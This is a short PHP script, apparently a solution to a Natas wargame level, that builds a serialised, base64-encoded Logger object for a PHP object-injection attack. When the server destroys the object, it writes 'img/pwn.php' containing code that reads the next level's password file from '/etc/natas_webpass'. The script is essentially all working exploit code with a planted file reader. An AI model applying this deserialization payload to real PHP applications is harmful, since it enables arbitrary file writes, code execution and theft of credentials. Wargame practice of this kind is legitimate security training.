<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        $this->logFile = "img/pwn.php";

        $this->initMsg = "";

        $this->exitMsg =
            "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
    }
}

$logger = new Logger();

$payload = base64_encode(serialize($logger));

echo $payload . "\n";
/* this $logger instance from Logger class that server's code have same name class
so this would trigger server's Logger class's magical method like __construct(), __desctruct()
*/
?>
